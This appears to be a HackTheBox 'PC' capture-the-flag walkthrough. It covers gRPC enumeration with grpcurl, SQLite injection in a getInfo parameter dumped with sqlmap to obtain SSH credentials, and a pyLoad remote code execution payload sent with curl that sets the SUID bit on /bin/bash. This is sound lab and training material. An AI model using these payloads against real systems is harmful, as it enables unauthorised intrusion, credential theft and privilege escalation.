# HackTheBox - PC
<p align="center"><b>rating: EASY</b></p>

Pathway to foothold, found gRPC running on port 50051

resources for understanding gRPC:

https://grpc.io/docs/what-is-grpc/
https://grpc.io/docs/languages/go/basics/
https://grpc.io/docs/guides/


For communicating with gRPC in terminal:
https://github.com/fullstorydev/grpcurl

GUI for communicating with gRPC using gRPCurl

command to list services available:
grpcurl -plaintext 10.10.11.214:50051 list

SimpleApp
grpc.reflection.v1alpha.ServerReflection

list the methods available for the SimpleApp service:
grpcurl -plaintext 10.10.11.214:50051 list SimpleApp

SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo


create an account with this command
grpcurl -plaintext -d '{"username": "username", "password": "password"}'  pc.htb:50051 SimpleApp/RegisterUser

intercept POST request for getInfo, and see that the 'id' parameter is vulnerable to SQLite injection

copy the POST request and run in through sqlmap using ```sqlmap -r getInfo.req --dump```

get the password for ssh

+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----

using linpeas, see that there is a service running on port 8000

forward the port using ```ssh -L 8000:localhost:8000 sau@pc.htb```

see that the service is pyLoad.  Check pyLoad version, and see that it is vulnerable


curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"chmod%20u%2Bs%20%2Fbin%2Fbash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'